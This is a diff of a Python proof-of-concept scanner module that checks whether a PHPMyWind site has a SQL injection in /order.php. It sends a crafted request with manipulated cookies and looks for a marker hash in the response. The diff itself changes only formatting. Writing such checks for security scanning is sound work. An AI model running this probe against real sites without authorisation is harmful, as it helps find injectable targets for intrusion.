@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPMyWind_0012' # 平台漏洞编号，留空
+    vuln_id = 'PHPMyWind_0012'  # 平台漏洞编号，留空
     name = 'PHPMyWind SQL注射'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-01-07'  # 漏洞公布时间
     desc = '''
         漏洞出在/order.php中，
@@ -34,7 +35,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             o = urlparse.urlparse(self.target)
             raw = '''
@@ -43,7 +44,8 @@ Host: {host}
 Cookie: shoppingcart=a;username=b
             '''.format(host=o.hostname)
 
-            code, head, body, errcode, final_url = hh.http(self.target, raw=raw);
+            code, head, body, errcode, final_url = hh.http(
+                self.target, raw=raw)
             if code == 200 and '4a8a08f09d37b73795649038408b5f33' in body:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -53,6 +55,7 @@ Cookie: shoppingcart=a;username=b
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
